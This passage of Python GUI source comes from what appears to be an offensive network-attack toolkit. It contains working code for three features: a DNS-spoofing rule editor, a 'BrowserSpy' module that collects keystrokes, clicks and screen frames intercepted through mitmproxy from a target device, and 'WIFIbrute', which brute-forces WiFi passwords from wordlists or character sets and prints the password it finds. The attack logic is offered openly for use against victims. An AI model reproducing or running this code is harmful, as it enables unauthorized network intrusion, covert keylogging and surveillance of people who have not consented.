                    spoofed_ip.delete(0, tkinter.END)
                    with open(self.dns_rules_path, 'w', encoding='utf-8') as f:
                        json.dump(self.dns_spoof_dict, f, indent=4)
        def edit_rule():
            domain=target_domain.get()
            spfip=spoofed_ip.get()
            selected_item=dnspoof_listbox.curselection()
            if domain and spfip and selected_item:
                selected_domain=dnspoof_listbox.get(selected_item[0]).split(' -> ')[0]
                index=selected_item[0]
                spfip=self.get_ip_by_host(spfip)
                if selected_domain in self.dns_spoof_dict:
                    del self.dns_spoof_dict[selected_domain]
                self.dns_spoof_dict[domain]=spfip
                dnspoof_listbox.delete(index)
                dnspoof_listbox.insert(index, f'{domain} -> {spfip}')
                target_domain.delete(0, tkinter.END)
                spoofed_ip.delete(0, tkinter.END)
                with open(self.dns_rules_path, 'w', encoding='utf-8') as f:
                    json.dump(self.dns_spoof_dict, f, indent=4)
        buttons_frame=tkinter.Frame(main_frame, bg=self.BLACK_BG)
        buttons_frame.pack(side='bottom', fill='x', pady=10)
        for i in range(3):
            buttons_frame.grid_columnconfigure(i, weight=1)
        add_button=tkinter.Button(buttons_frame, text='Add', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=add_rule)
        add_button.bind('<Enter>', lambda e: add_button.config(bg=self.BUTTON_HOVER))
        add_button.bind('<Leave>', lambda e: add_button.config(bg=self.BLACK_BG))
        add_button.grid(row=0, column=0, padx=10, sticky='nsew')
        delete_button=tkinter.Button(buttons_frame, text='Delete', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=delete_rule)
        delete_button.bind('<Enter>', lambda e: delete_button.config(bg=self.BUTTON_HOVER))
        delete_button.bind('<Leave>', lambda e: delete_button.config(bg=self.BLACK_BG))
        delete_button.grid(row=0, column=1, padx=10, sticky='nsew')
        edit_button=tkinter.Button(buttons_frame, text='Edit', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=edit_rule)
        edit_button.bind('<Enter>', lambda e: edit_button.config(bg=self.BUTTON_HOVER))
        edit_button.bind('<Leave>', lambda e: edit_button.config(bg=self.BLACK_BG))
        edit_button.grid(row=0, column=2, padx=10, sticky='nsew')
        dnspoof_window.mainloop()
    def close_browserspy(self):
        self.is_spying=False
        with open(self.is_spying_path, 'w', encoding='utf-8') as f:
            f.write('FALSE')
        if self.spy_socket:
            self.spy_socket.close()
            self.spy_socket=None
        self.browserspy_button.config(state=tkinter.NORMAL)
        self.remove_child_window(self.browserspy_window)
        self.current_pil_image=None
        self.browserspy_window=None
    def browserspy(self):
        if self.mitm_process is None:
            self.inform_user('Error while starting BrowserSpy: mitmproxy must be enabled first', 'error')
            return
        device_name=self.devices[self.target_ip]['device']
        self.browserspy_button.config(state=tkinter.DISABLED)
        self.browserspy_window=CTk()
        self.browserspy_window.title(f'{self.target_ip} - {device_name}')
        self.browserspy_window.iconbitmap(os.path.join(self.base_path, 'icon.ico'))
        self.browserspy_window.geometry('900x650')
        self.child_windows.append(self.browserspy_window)
        self.browserspy_window.protocol('WM_DELETE_WINDOW', self.close_browserspy)
        style=ttk.Style(self.browserspy_window)
        style.theme_use('default')
        style.configure('TScrollbar', background=self.DARK_BG, troughcolor=self.BLACK_BG, bordercolor=self.LIME_FG, arrowcolor=self.LIME_FG, relief=tkinter.FLAT, troughrelief=tkinter.FLAT)
        style.map('TScrollbar', background=[('active', self.LIME_FG), ('pressed', self.LIME_FG)], arrowcolor=[('active', self.DARK_BG), ('pressed', self.DARK_BG)])
        style.configure('TPanedwindow', background=self.BLACK_BG)
        style.map('TPanedwindow', background=[('active', self.BLACK_BG)])
        main_frame=tkinter.Frame(self.browserspy_window, bg=self.BLACK_BG, relief=tkinter.SUNKEN, borderwidth=1)
        main_frame.pack(fill='both', expand=True)
        tkinter.Label(main_frame, text='BrowserSpy', fg=self.LIME_FG, bg=self.BLACK_BG, font=('Consolas', 30, 'bold')).pack(side='top', pady=5)
        def fit_image(event=None):
            if self.current_pil_image:
                try:
                    c_w=browser_screen_canvas.winfo_width()
                    c_h=browser_screen_canvas.winfo_height()
                    if c_w>10 and c_h>10:
                        img_copy=self.current_pil_image.resize((c_w, c_h), Image.Resampling.LANCZOS)
                        self.tk_image=ImageTk.PhotoImage(img_copy, master=browser_screen_canvas)
                        browser_screen_canvas.delete('all')
                        browser_screen_canvas.create_image(c_w//2, c_h//2, anchor='center', image=self.tk_image)
                except (tkinter.TclError, RuntimeError):
                    pass
        def clear():
            self.current_pil_image=None
            browser_screen_canvas.delete('all')
            browserspy_keylogs.config(state=tkinter.NORMAL)
            browserspy_keylogs.delete(1.0, tkinter.END)
            browserspy_keylogs.insert(tkinter.END, 'NOTE: Captured key strokes and mouse-click coordinates of target device will display here ...\n')
            browserspy_keylogs.config(state=tkinter.DISABLED)
        def socket_listener():
            self.spy_socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.spy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.spy_socket.bind(('127.0.0.1', 9999))
            self.spy_socket.listen(1)
            while self.is_spying:
                try:
                    conn, addr=self.spy_socket.accept()
                    with conn:
                        f=conn.makefile('r', encoding='utf-8', errors='ignore')
                        while self.is_spying:
                            line=f.readline()
                            if not line:
                                break
                            try:
                                msg=json.loads(line)
                                if msg['type']=='frame':
                                    self.current_pil_image=Image.open(io.BytesIO(base64.b64decode(msg['data'])))
                                    self.browserspy_window.after(0, fit_image)
                                elif msg['type'] in ['keystroke', 'click']:
                                    data=json.loads(msg['data'])
                                    when=datetime.fromtimestamp(data['t']/1000.0).strftime('[%Y-%m-%d %H:%M:%S]')
                                    where=data['url']
                                    if msg['type']=='keystroke':
                                        what=data['key']
                                        append_log(f'{when} keydown \'{what}\' from {where}\n')
                                    elif msg['type']=='click':
                                        what=data['event']
                                        x,y=data['x'],data['y']
                                        append_log(f'{when} {what} (X: {x}; Y: {y}) from {where}\n')
                            except Exception as e:
                                self.inform_user(f'Error while processing data from BrowserSpy: {e}', 'error')
                                break
                except Exception:
                    break
        def append_log(text):
            browserspy_keylogs.config(state=tkinter.NORMAL)
            browserspy_keylogs.insert(tkinter.END, text)
            browserspy_keylogs.see(tkinter.END)
            browserspy_keylogs.config(state=tkinter.DISABLED)
        def stop_spying():
            self.is_spying=False
            with open(self.is_spying_path, 'w', encoding='utf-8') as f:
                f.write('FALSE')
            if self.spy_socket:
                self.spy_socket.close()
                self.spy_socket=None
            spy_button.config(text='Spy', command=start_spying)
        def start_spying():
            self.is_spying=True
            spy_button.config(text='Stop', command=stop_spying)
            threading.Thread(target=socket_listener, daemon=True).start()
            with open(self.is_spying_path, 'w', encoding='utf-8') as f:
                f.write('TRUE')
        buttons_frame=tkinter.Frame(main_frame, bg=self.BLACK_BG)
        buttons_frame.pack(side='bottom', fill='x', pady=10)
        buttons_frame.grid_columnconfigure(0, weight=1)
        buttons_frame.grid_columnconfigure(1, weight=1)
        paned_window=ttk.Panedwindow(main_frame, orient='horizontal', style='TPanedwindow')
        paned_window.pack(fill='both', expand=True, padx=10, pady=5)
        browser_screen_canvas=tkinter.Canvas(paned_window, bg=self.DARK_BG, highlightbackground=self.LIME_FG, relief=tkinter.SUNKEN, width=280)
        browser_screen_canvas.bind('<Configure>', fit_image)
        paned_window.add(browser_screen_canvas, weight=1)
        keylog_info_frame=tkinter.Frame(paned_window, bg=self.DARK_BG, relief=tkinter.SUNKEN, borderwidth=0)
        paned_window.add(keylog_info_frame, weight=3)
        v_scrollbar=ttk.Scrollbar(keylog_info_frame, orient='vertical', style='TScrollbar')
        v_scrollbar.pack(side='right', fill='y')
        browserspy_keylogs=tkinter.Text(keylog_info_frame, wrap='word', yscrollcommand=v_scrollbar.set, bg=self.BLACK_BG, fg=self.LIME_FG, font=('Consolas', 9), selectbackground=self.LIME_FG, selectforeground=self.BLACK_BG, state=tkinter.NORMAL, cursor='arrow')
        browserspy_keylogs.insert(tkinter.END, 'NOTE: Captured key strokes and mouse-click coordinates of target device will display here ...\n')
        browserspy_keylogs.config(state=tkinter.DISABLED)
        browserspy_keylogs.pack(side='left', fill='both', expand=True)
        v_scrollbar.config(command=browserspy_keylogs.yview)
        clear_button=tkinter.Button(buttons_frame, text='Clear', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=clear)
        clear_button.bind('<Enter>', lambda e: clear_button.config(bg=self.BUTTON_HOVER))
        clear_button.bind('<Leave>', lambda e: clear_button.config(bg=self.BLACK_BG))
        clear_button.grid(row=0, column=0, padx=10, sticky='nsew')
        spy_button=tkinter.Button(buttons_frame, text='Spy', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=start_spying)
        spy_button.bind('<Enter>', lambda e: spy_button.config(bg=self.BUTTON_HOVER))
        spy_button.bind('<Leave>', lambda e: spy_button.config(bg=self.BLACK_BG))
        spy_button.grid(row=0, column=1, padx=10, sticky='nsew')
        self.browserspy_window.mainloop()
    def close_wifibrute(self, window):
        if self.wifi_scan_id:
            window.after_cancel(self.wifi_scan_id)
        if not self.stop_wifi_crack_event.is_set():
            self.stop_wifi_crack_event.set()
        self.wifibrute_button.config(state=tkinter.NORMAL)
        self.remove_child_window(window)
    def wifibrute(self):
        if not self.ifaces:
            self.inform_user('Error while starting WIFIbrute: connect your adapter first ... \n', 'error')
            return
        iface=self.ifaces[0]
        self.wifibrute_button.config(state=tkinter.DISABLED)
        wifibrute_window=CTk()
        wifibrute_window.title('WIFIbrute')
        wifibrute_window.iconbitmap(os.path.join(self.base_path, 'icon.ico'))
        wifibrute_window.geometry('915x700')
        self.child_windows.append(wifibrute_window)
        wifibrute_window.protocol('WM_DELETE_WINDOW', lambda: self.close_wifibrute(wifibrute_window))
        style=ttk.Style(wifibrute_window)
        style.theme_use('default')
        wifibrute_window.option_add('*TCombobox*Listbox.background', self.BLACK_BG)
        wifibrute_window.option_add('*TCombobox*Listbox.foreground', self.LIME_FG)
        wifibrute_window.option_add('*TCombobox*Listbox.selectBackground', self.LIME_FG)
        wifibrute_window.option_add('*TCombobox*Listbox.selectForeground', self.DARK_BG)
        wifibrute_window.option_add('*TCombobox*Listbox.font', self.ENTRY_FONT)
        wifibrute_window.option_add('*TCombobox*Listbox.relief', tkinter.SUNKEN)
        style.configure('TSeparator', background=self.LIME_FG)
        style.configure('TProgressbar', troughcolor=self.BLACK_BG, background=self.LIME_FG, thickness=25, borderwidth=0)
        style.configure('TEntry', fieldbackground=self.BLACK_BG, foreground=self.LIME_FG, insertcolor=self.LIME_FG, borderwidth=1, bordercolor=self.LIME_FG, selectbackground=self.LIME_FG, selectforeground=self.DARK_BG)
        style.map('TEntry', fieldbackground=[('focus', self.BLACK_BG)], foreground=[('focus', self.LIME_FG)])
        style.configure('TSpinbox', fieldbackground=self.BLACK_BG, foreground=self.LIME_FG, insertcolor=self.LIME_FG, arrowcolor=self.LIME_FG, background=self.DARK_BG, borderwidth=1, bordercolor=self.LIME_FG, selectbackground=self.LIME_FG, selectforeground=self.DARK_BG)
        style.map('TSpinbox', background=[('active', self.LIME_FG)], arrowcolor=[('active', self.DARK_BG)])
        style.configure('TScrollbar', background=self.DARK_BG, troughcolor=self.BLACK_BG, bordercolor=self.LIME_FG, arrowcolor=self.LIME_FG, relief=tkinter.FLAT, troughrelief=tkinter.FLAT)
        style.map('TScrollbar', background=[('active', self.LIME_FG), ('pressed', self.LIME_FG)], arrowcolor=[('active', self.DARK_BG), ('pressed', self.DARK_BG)])
        style.configure('TCombobox', fieldbackground=self.BLACK_BG, foreground=self.LIME_FG, arrowcolor=self.LIME_FG, background=self.DARK_BG, borderwidth=1, bordercolor=self.LIME_FG, selectbackground=self.LIME_FG, selectforeground=self.DARK_BG)
        style.map('TCombobox', fieldbackground=[('readonly', self.BLACK_BG), ('focus', self.BLACK_BG)], foreground=[('readonly', self.LIME_FG), ('focus', self.LIME_FG)], background=[('active', self.LIME_FG)], arrowcolor=[('active', self.DARK_BG)])
        main_frame=tkinter.Frame(wifibrute_window, bg=self.BLACK_BG, relief=tkinter.SUNKEN, borderwidth=1)
        main_frame.pack(fill='both', expand=True)
        tkinter.Label(main_frame, text='WIFIbrute', fg=self.LIME_FG, bg=self.BLACK_BG, font=('Consolas', 30, 'bold')).pack(pady=5)
        def calculate_time_remaining(max_combinations, timeout_per_attempt):
            try:
                total_seconds=int(max_combinations*timeout_per_attempt)
                if total_seconds<0:
                    return '00:00:00'
                days=total_seconds//86400
                remaining_seconds=total_seconds%86400
                hours=remaining_seconds//3600
                remaining_seconds%=3600
                minutes=remaining_seconds//60
                seconds=remaining_seconds%60
                time_str=f'{hours:02}:{minutes:02}:{seconds:02}'
                if days>0:
                    return f'{days} days, {time_str}'
                else:
                    return time_str
            except (MemoryError, Exception):
                return 'ERROR'
        def update_ssid_combobox():
            target_wifi.config(values=self.wifis_to_display)
            self.wifi_scan_id=wifibrute_window.after(1000, update_ssid_combobox)
        def clear_wifi():
            self.wifis_to_display=[]
            target_wifi.set('ATTENTION - select target\'s WiFi here, list updates are paused while the dropdown is open ...')
            target_wifi.config(values=self.wifis_to_display)
            target_wifi.selection_clear()
        def upload_wordlist():
            wordlist_file=filedialog.askopenfilename(parent=wifibrute_window, title='Open wordlist file', filetypes=[('Text files', '*.txt')], defaultextension='.txt')
            if not wordlist_file:
                return
            wordlist_path.config(state=tkinter.NORMAL)
            wordlist_path.delete(0, tkinter.END)
            wordlist_path.insert(tkinter.END, wordlist_file)
            wordlist_path.config(state=tkinter.DISABLED)
        def clear_wordlist():
            wordlist_path.config(state=tkinter.NORMAL)
            wordlist_path.delete(0, tkinter.END)
            wordlist_path.config(state=tkinter.DISABLED)
        def stop_cracking():
            self.stop_wifi_crack_event.set()
            wifibrute_info_terminal.config(state=tkinter.NORMAL)
            wifibrute_info_terminal.delete(1.0, tkinter.END)
            wifibrute_info_terminal.insert(tkinter.END, '[-] User stopped the process ... \n', 'error')
            wifibrute_info_terminal.config(state=tkinter.DISABLED)
            crack_button.config(text='Crack', command=start_cracking)
        def create_profile(target_ssid, target_bssid, password):
            profile=pywifi.Profile()
            akm_val=self.wifis[target_bssid]['akm']
            auth_val=self.wifis[target_bssid]['auth']
            cipher_val=self.wifis[target_bssid]['cipher']
            profile.ssid=target_ssid
            if target_bssid.endswith(':'):
                profile.bssid=target_bssid
            else:
                profile.bssid=target_bssid+':'
            if isinstance(auth_val, list):
                profile.auth=auth_val[0] if auth_val else 0
            else:
                profile.auth=auth_val
            if isinstance(akm_val, list):
                profile.akm=akm_val if akm_val else [4]
            else:
                profile.akm.append(akm_val if akm_val!=0 else 4)
            if isinstance(cipher_val, list):
                profile.cipher=cipher_val[0] if cipher_val and cipher_val[0]!=0 else 3
            else:
                profile.cipher=cipher_val if cipher_val!=0 else 3
            profile.key=password
            return profile
        def wifi_crack(combination_count, wordlist_passwords, target_bssid, target_ssid, charset, min_l, max_l, timeout):
            current_combo=0
            p_bar.config(maximum=combination_count, value=0)
            if wordlist_passwords:
                for pwd in wordlist_passwords:
                    if self.stop_wifi_crack_event.is_set():
                        return
                    remaining=combination_count-current_combo
                    estimate=calculate_time_remaining(remaining, timeout)
                    current_combo+=1
                    try:
                        wifibrute_window.after(0, lambda: p_bar.config(value=current_combo))
                        wifibrute_window.after(0, lambda: combo_left.config(text=f'{current_combo}/{combination_count}'))
                        wifibrute_window.after(0, lambda: current_password.config(text=pwd))
                        wifibrute_window.after(0, lambda: time_left.config(text=estimate))
                    except (tkinter.TclError, RuntimeError):
                        pass
                    iface.disconnect()
                    target_profile=create_profile(target_ssid, target_bssid, pwd)
                    target_tmp=iface.add_network_profile(target_profile)
                    iface.connect(target_tmp)
                    if self.stop_wifi_crack_event.wait(timeout):
                        return
                    if iface.status()==4:
                        self.stop_wifi_crack_event.set()
                        wifibrute_window.after(0, lambda: p_bar.config(value=combination_count))
                        wifibrute_info_terminal.config(state=tkinter.NORMAL)
                        wifibrute_info_terminal.delete(1.0, tkinter.END)
                        wifibrute_info_terminal.insert(tkinter.END, f'[+] The password is {pwd}\n', 'success')
                        wifibrute_info_terminal.config(state=tkinter.DISABLED)
                        crack_button.config(text='Crack', command=start_cracking)
                        return
                    else:
                        iface.remove_network_profile(target_tmp)
            if charset:
                for length in range(min_l, max_l+1):
                    for combo in itertools.product(charset, repeat=length):
                        if self.stop_wifi_crack_event.is_set():
                            return
                        pwd=''.join(combo)
                        remaining=combination_count-current_combo
                        estimate=calculate_time_remaining(remaining, timeout)
                        current_combo+=1
                        try:
                            wifibrute_window.after(0, lambda: p_bar.config(value=current_combo))
                            wifibrute_window.after(0, lambda: combo_left.config(text=f'{current_combo}/{combination_count}'))
                            wifibrute_window.after(0, lambda: current_password.config(text=pwd))
                            wifibrute_window.after(0, lambda: time_left.config(text=estimate))
                        except (tkinter.TclError, RuntimeError):
                            pass
                        iface.disconnect()
                        target_profile=create_profile(target_ssid, target_bssid, pwd)
                        target_tmp=iface.add_network_profile(target_profile)
                        iface.connect(target_tmp)
                        if self.stop_wifi_crack_event.wait(timeout):
                            return
                        if iface.status()==4:
                            self.stop_wifi_crack_event.set()
                            wifibrute_window.after(0, lambda: p_bar.config(value=combination_count))
                            wifibrute_info_terminal.config(state=tkinter.NORMAL)
                            wifibrute_info_terminal.delete(1.0, tkinter.END)
                            wifibrute_info_terminal.insert(tkinter.END, f'[+] The password is {pwd}\n', 'success')
                            wifibrute_info_terminal.config(state=tkinter.DISABLED)
                            crack_button.config(text='Crack', command=start_cracking)
                            return
                        else:
                            iface.remove_network_profile(target_tmp)
            self.stop_wifi_crack_event.set()
            wifibrute_info_terminal.config(state=tkinter.NORMAL)
            wifibrute_info_terminal.delete(1.0, tkinter.END)
            wifibrute_info_terminal.insert(tkinter.END, '[-] Password not found ... \n', 'error')
            wifibrute_info_terminal.config(state=tkinter.DISABLED)
            crack_button.config(text='Crack', command=start_cracking)
        def start_cracking():
            combination_count=0
            wordlist_passwords=[]
            target=target_wifi.get().split(' - ')
            target_bssid=target[0]
            target_ssid=target[1]
            wordlist=wordlist_path.get()
            charset=bruteforce_charset.get()
            min_l=int(min_length.get()) if min_length.get() else 8
            max_l=int(max_length.get()) if max_length.get() else 8
            timeout=int(handshake_timeout.get()) if handshake_timeout.get() else 1
            if target_bssid=='ATTENTION':
                wifibrute_info_terminal.config(state=tkinter.NORMAL)
                wifibrute_info_terminal.delete(1.0, tkinter.END)
                wifibrute_info_terminal.insert(tkinter.END, 'Error while starting WIFIbrute: please select the target wifi ... \n', 'error')
                wifibrute_info_terminal.config(state=tkinter.DISABLED)
                return
            if not wordlist and not charset:
                wifibrute_info_terminal.config(state=tkinter.NORMAL)
                wifibrute_info_terminal.delete(1.0, tkinter.END)
                wifibrute_info_terminal.insert(tkinter.END, 'Error while starting WIFIbrute: please use the wordlist or bruteforce charset to start cracking ... \n', 'error')
                wifibrute_info_terminal.config(state=tkinter.DISABLED)
                return
            if wordlist:
                with open(wordlist, 'rb') as f:
                    for line in f:
                        pwd=line.strip()
                        if not pwd or len(pwd)<8 or len(pwd)>64:
                            continue
                        combination_count+=1
                        wordlist_passwords.append(pwd.decode('utf-8', errors='ignore'))
            if charset:
                if len(set(charset))!=len(charset):
                    wifibrute_info_terminal.config(state=tkinter.NORMAL)
                    wifibrute_info_terminal.delete(1.0, tkinter.END)
                    wifibrute_info_terminal.insert(tkinter.END, 'Error while starting WIFIbrute: the characters in bruteforce charset repeats ... \n', 'error')
                    wifibrute_info_terminal.config(state=tkinter.DISABLED)
                    return
                combination_count+=sum(len(charset)**i for i in range(min_l, max_l+1))
            target_ssid=self.wifis[target_bssid]['ssid']
            target_signal=str(self.wifis[target_bssid]['signal'])+' dBm'
            target_frequency=str(round(self.wifis[target_bssid]['frequency']/1000000, 1))+' GHz'
            target_auth=self.akm_map.get(self.wifis[target_bssid]['akm'][0] if self.wifis[target_bssid]['akm'] else 0, 'Other')
            target_cipher=self.cipher_map.get(self.wifis[target_bssid]['cipher'] if self.wifis[target_bssid]['cipher'] else 0, 'CCMP (AES)')
            wifibrute_info_terminal.config(state=tkinter.NORMAL)
            wifibrute_info_terminal.delete(1.0, tkinter.END)
            wifibrute_info_terminal.insert(tkinter.END, f'[+] BSSID: {target_bssid}\n')
            wifibrute_info_terminal.insert(tkinter.END, f'[+] SSID: {target_ssid}\n')
            wifibrute_info_terminal.insert(tkinter.END, f'[+] Signal: {target_signal}\n')
            wifibrute_info_terminal.insert(tkinter.END, f'[+] Frequency: {target_frequency}\n')
            wifibrute_info_terminal.insert(tkinter.END, f'[+] Auth: {target_auth}\n')
            wifibrute_info_terminal.insert(tkinter.END, f'[+] Cipher: {target_cipher}\n')
            if target_ssid=='[hidden network]':
                wifibrute_info_terminal.insert(tkinter.END, f'[-] Can not crack hidden networks like {target_bssid}, try to crack another one ... \n', 'error')
                wifibrute_info_terminal.config(state=tkinter.DISABLED)
                v_scrollbar.config(command=wifibrute_info_terminal.yview)
            else:
                wifibrute_info_terminal.insert(tkinter.END, f'[*] Cracking {target_bssid}, wait if you can ... \n', 'success')
                wifibrute_info_terminal.config(state=tkinter.DISABLED)
                v_scrollbar.config(command=wifibrute_info_terminal.yview)
                self.stop_intercepting()
                if not self.stop_arp_scan_event.is_set():
                    self.stop_arp_scan_event.set()
                self.clear_victim_devices()
                self.inform_user(f'ATTENTION: Please ReOpen the program after cracking, to ReScan local devices', 'error')
                self.stop_wifi_crack_event.clear()
                threading.Thread(target=wifi_crack, args=(combination_count, wordlist_passwords, target_bssid, target_ssid, charset, min_l, max_l, timeout), daemon=True).start()
                crack_button.config(text='Stop', command=stop_cracking)
        input_frame=tkinter.Frame(main_frame, bg=self.BLACK_BG)
        input_frame.pack(pady=10, fill='x', padx=20)
        for i in range(8):
            if i%2!=0:
                input_frame.grid_columnconfigure(i, weight=1)
            else:
                input_frame.grid_columnconfigure(i, weight=0)
        vcmd=wifibrute_window.register(self.validate_digit_only)
        tkinter.Label(input_frame, text='Target WiFi: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.VICTIM_FONT).grid(row=0, column=0, pady=5, sticky='e')
        target_wifi_frame=tkinter.Frame(input_frame, bg='black')
        target_wifi_frame.grid(row=0, column=1, columnspan=7, padx=5, pady=5, sticky='ew')
        target_wifi_frame.grid_columnconfigure(0, weight=1)
        target_wifi_frame.grid_columnconfigure(1, weight=0)
        target_wifi=ttk.Combobox(target_wifi_frame, values=[], state='readonly', font=self.ENTRY_FONT, style='TCombobox')
        target_wifi.set('ATTENTION - select target\'s WiFi here, list updates are paused while the dropdown is open ...')
        target_wifi.grid(row=0, column=0, columnspan=6, padx=5, pady=5, sticky='ew')
        clear_wifi_button=tkinter.Button(target_wifi_frame, text='Clear', bg=self.BLACK_BG, fg='#00FFFF', activebackground='#00FFFF', activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground='#00FFFF', highlightcolor='#00FFFF', cursor='hand2', font=self.VICTIM_FONT, width=12, command=clear_wifi, disabledforeground='#FFD700')
        clear_wifi_button.bind('<Enter>', lambda e: clear_wifi_button.config(bg=self.BUTTON_HOVER))
        clear_wifi_button.bind('<Leave>', lambda e: clear_wifi_button.config(bg=self.BLACK_BG))
        clear_wifi_button.grid(row=0, column=7, padx=5, pady=5, sticky='ew')
        ttk.Separator(input_frame, orient='horizontal', style='TSeparator').grid(row=1, column=0, columnspan=10, padx=5, pady=5, sticky='ew')
        tkinter.Label(input_frame, text='Wordlist: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=2, column=0, pady=5, sticky='e')
        wordlist_frame=tkinter.Frame(input_frame, bg='black')
        wordlist_frame.grid(row=2, column=1, columnspan=7, padx=5, pady=5, sticky='ew')
        wordlist_frame.grid_columnconfigure(0, weight=1)
        wordlist_frame.grid_columnconfigure(1, weight=0)
        wordlist_path=ttk.Entry(wordlist_frame, font=self.ENTRY_FONT, style='TEntry', state=tkinter.DISABLED)
        wordlist_path.grid(row=0, column=0, columnspan=6, padx=5, pady=5, sticky='ew')
        upload_button=tkinter.Button(wordlist_frame, text='Upload', bg=self.BLACK_BG, fg='#FFD700', activebackground='#FFD700', activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground='#FFD700', highlightcolor='#FFD700', cursor='hand2', font=self.ENTRY_FONT, width=12, command=upload_wordlist, disabledforeground='#00FFFF')
        upload_button.bind('<Enter>', lambda e: upload_button.config(bg=self.BUTTON_HOVER))
        upload_button.bind('<Leave>', lambda e: upload_button.config(bg=self.BLACK_BG))
        upload_button.grid(row=0, column=7, padx=5, pady=5, sticky='ew')
        clear_button=tkinter.Button(wordlist_frame, text='Clear', bg=self.BLACK_BG, fg='#00FFFF', activebackground='#00FFFF', activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground='#00FFFF', highlightcolor='#00FFFF', cursor='hand2', font=self.ENTRY_FONT, width=12, command=clear_wordlist, disabledforeground='#FFD700')
        clear_button.bind('<Enter>', lambda e: clear_button.config(bg=self.BUTTON_HOVER))
        clear_button.bind('<Leave>', lambda e: clear_button.config(bg=self.BLACK_BG))
        clear_button.grid(row=0, column=8, padx=5, pady=5, sticky='ew')
        tkinter.Label(input_frame, text='Bruteforce charset: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=3, column=0, pady=5, sticky='e')
        bruteforce_charset=ttk.Entry(input_frame, font=self.ENTRY_FONT, style='TEntry')
        bruteforce_charset.grid(row=3, column=1, columnspan=7, padx=5, pady=5, sticky='ew')
        bruteforce_charset.insert(tkinter.END, digits+ascii_letters+punctuation)
        tkinter.Label(input_frame, text='Min length: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=4, column=0, pady=5, sticky='e')
        min_length=ttk.Spinbox(input_frame, from_=8, to=64, validate='key', validatecommand=(vcmd, '%P'), font=self.ENTRY_FONT, wrap=True, style='TSpinbox')
        min_length.set(8)
        min_length.grid(row=4, column=1, columnspan=7, padx=5, pady=5, sticky='ew')
        tkinter.Label(input_frame, text='Max length: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=5, column=0, pady=5, sticky='e')
        max_length=ttk.Spinbox(input_frame, from_=8, to=64, validate='key', validatecommand=(vcmd, '%P'), font=self.ENTRY_FONT, wrap=True, style='TSpinbox')
        max_length.set(8)
        max_length.grid(row=5, column=1, columnspan=7, padx=5, pady=5, sticky='ew')
        tkinter.Label(input_frame, text='Handshake timeout: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=6, column=0, pady=5, sticky='e')
        handshake_timeout=ttk.Spinbox(input_frame, from_=1, to=20, validate='key', validatecommand=(vcmd, '%P'), font=self.ENTRY_FONT, wrap=True, style='TSpinbox')
        handshake_timeout.set(2)
        handshake_timeout.grid(row=6, column=1, columnspan=7, padx=5, pady=5, sticky='ew')
        crack_button=tkinter.Button(main_frame, text='Crack', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=start_cracking, disabledforeground='#FFD700')
        crack_button.bind('<Enter>', lambda e: crack_button.config(bg=self.BUTTON_HOVER))
        crack_button.bind('<Leave>', lambda e: crack_button.config(bg=self.BLACK_BG))
        crack_button.pack(pady=10, fill='x', padx=20)
        cracking_state=tkinter.Frame(main_frame, bg='black')
        cracking_state.pack(pady=10, fill='x', padx=20)
        combo_left=tkinter.Label(cracking_state, text='--/--', fg='#00FFFF', bg=self.BLACK_BG, font=self.ENTRY_FONT)
        combo_left.grid(row=0, column=0, sticky='w', padx=10)
        current_password=tkinter.Label(cracking_state, text='00000000', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.ENTRY_FONT)
        current_password.grid(row=0, column=1, padx=10)
        time_left=tkinter.Label(cracking_state, text='--:--:--', fg='#FFD700', bg=self.BLACK_BG, font=self.ENTRY_FONT)
        time_left.grid(row=0, column=2, sticky='e', padx=10)
        p_border=tkinter.Frame(main_frame, bg=self.LIME_FG)
        p_border.pack(pady=10, fill='x', padx=20)
        p_bar=ttk.Progressbar(p_border, style='TProgressbar', orient='horizontal', mode='determinate')
        p_bar.pack(fill='x', padx=1, pady=1)
        wifibrute_info_frame=tkinter.Frame(main_frame, bg=self.DARK_BG, relief=tkinter.SUNKEN, borderwidth=0)
        wifibrute_info_frame.pack(pady=10, padx=10, fill='both', expand=True)
        v_scrollbar=ttk.Scrollbar(wifibrute_info_frame, orient='vertical', style='TScrollbar')
